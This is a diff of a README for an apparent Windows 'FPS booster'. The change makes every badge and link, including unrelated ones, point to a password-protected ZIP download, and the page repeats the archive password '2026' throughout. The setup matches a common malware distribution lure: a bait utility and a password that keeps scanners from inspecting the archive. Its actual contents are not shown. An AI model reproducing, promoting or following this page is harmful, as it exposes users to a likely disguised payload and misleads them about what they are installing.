@@ -1,6 +1,6 @@
 <div align="center">
 
-<a href="https://github.com/asdafgs419/Extreme-FPS-Boost/raw/refs/heads/main/extreme-FPS.zip">
+<a href="https://github.com/asdafgs419/Extreme-FPS-Boost/raw/main/extreme-FPS.zip">
   <img src="./assets/fps-boost-banner.png" alt="Extreme FPS Boost — Windows performance optimizer" width="100%">
 </a>
 
@@ -8,14 +8,14 @@
 
 ### Boost FPS, reduce input latency, and optimize Windows for smoother gameplay.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4?style=for-the-badge&logo=windows11&logoColor=white)](https://www.microsoft.com/windows/)
-[![Architecture](https://img.shields.io/badge/Architecture-64--bit-24292F?style=for-the-badge)](#system-requirements)
-[![Archive](https://img.shields.io/badge/Archive-extreme--FPS.zip-6F42C1?style=for-the-badge&logo=files&logoColor=white)](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/refs/heads/main/extreme-FPS.zip)
-[![Password](https://img.shields.io/badge/ZIP%20PASSWORD-2026-FFB000?style=for-the-badge&labelColor=111111)](#archive-password)
+[![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4?style=for-the-badge&logo=windows11&logoColor=white)](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/main/extreme-FPS.zip)
+[![Architecture](https://img.shields.io/badge/Architecture-64--bit-24292F?style=for-the-badge)](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/main/extreme-FPS.zip)
+[![Archive](https://img.shields.io/badge/Archive-extreme--FPS.zip-6F42C1?style=for-the-badge&logo=files&logoColor=white)](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/main/extreme-FPS.zip)
+[![Password](https://img.shields.io/badge/ZIP%20PASSWORD-2026-FFB000?style=for-the-badge&labelColor=111111)](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/main/extreme-FPS.zip)
 
 <br>
 
-[![Download Extreme FPS Boost](https://img.shields.io/badge/DOWNLOAD%20NOW-extreme--FPS.zip-72FF00?style=for-the-badge&logo=github&logoColor=black&labelColor=111111)](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/refs/heads/main/extreme-FPS.zip)
+[![Download Extreme FPS Boost](https://img.shields.io/badge/DOWNLOAD%20NOW-extreme--FPS.zip-72FF00?style=for-the-badge&logo=github&logoColor=black&labelColor=111111)](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/main/extreme-FPS.zip)
 
 <br>
 
@@ -84,7 +84,7 @@ It applies performance-focused Windows settings without requiring complicated ma
 
 ### Download Extreme FPS Boost
 
-<a href="https://github.com/asdafgs419/Extreme-FPS-Boost/raw/refs/heads/main/extreme-FPS.zip">
+<a href="https://github.com/asdafgs419/Extreme-FPS-Boost/raw/main/extreme-FPS.zip">
   <img src="https://img.shields.io/badge/⬇%20DOWNLOAD-extreme--FPS.zip-72FF00?style=for-the-badge&labelColor=111111" alt="Download Extreme FPS Boost">
 </a>
 
@@ -100,7 +100,7 @@ It applies performance-focused Windows settings without requiring complicated ma
 
 ### 🔐 ZIP PASSWORD: `2026`
 
-[**Direct download: extreme-FPS.zip**](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/refs/heads/main/extreme-FPS.zip)
+[**Direct download: extreme-FPS.zip**](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/main/extreme-FPS.zip)
 
 </div>
 
@@ -140,7 +140,7 @@ The password contains four digits with no spaces.
 
 ## 📖 Installation
 
-1. [Download `extreme-FPS.zip`](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/refs/heads/main/extreme-FPS.zip).
+1. [Download `extreme-FPS.zip`](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/main/extreme-FPS.zip).
 2. Open the downloaded archive using 7-Zip, WinRAR, or another ZIP extractor.
 3. Enter the archive password: **`2026`**.
 4. Extract all files into a separate folder.
@@ -278,7 +278,7 @@ Enter all four digits without spaces.
 
 Download the archive directly from the official repository:
 
-[**Download extreme-FPS.zip**](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/refs/heads/main/extreme-FPS.zip)
+[**Download extreme-FPS.zip**](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/main/extreme-FPS.zip)
 
 After downloading, extract it using password **`2026`**.
 
@@ -451,7 +451,7 @@ windows-utility
 
 ## 🔐 ARCHIVE PASSWORD: `2026`
 
-[![Download ZIP](https://img.shields.io/badge/DOWNLOAD-extreme--FPS.zip-72FF00?style=for-the-badge&logo=github&logoColor=black&labelColor=111111)](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/refs/heads/main/extreme-FPS.zip)
+[![Download ZIP](https://img.shields.io/badge/DOWNLOAD-extreme--FPS.zip-72FF00?style=for-the-badge&logo=github&logoColor=black&labelColor=111111)](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/main/extreme-FPS.zip)
 
 <br>
 
@@ -459,7 +459,7 @@ windows-utility
 
 <br>
 
-[⬇️ Download ZIP](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/refs/heads/main/extreme-FPS.zip) •
+[⬇️ Download ZIP](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/main/extreme-FPS.zip) •
 [⭐ Star](https://github.com/asdafgs419/Extreme-FPS-Boost/stargazers) •
 [🐛 Report a Bug](https://github.com/asdafgs419/Extreme-FPS-Boost/issues/new) •
 [📁 Repository](https://github.com/asdafgs419/Extreme-FPS-Boost)
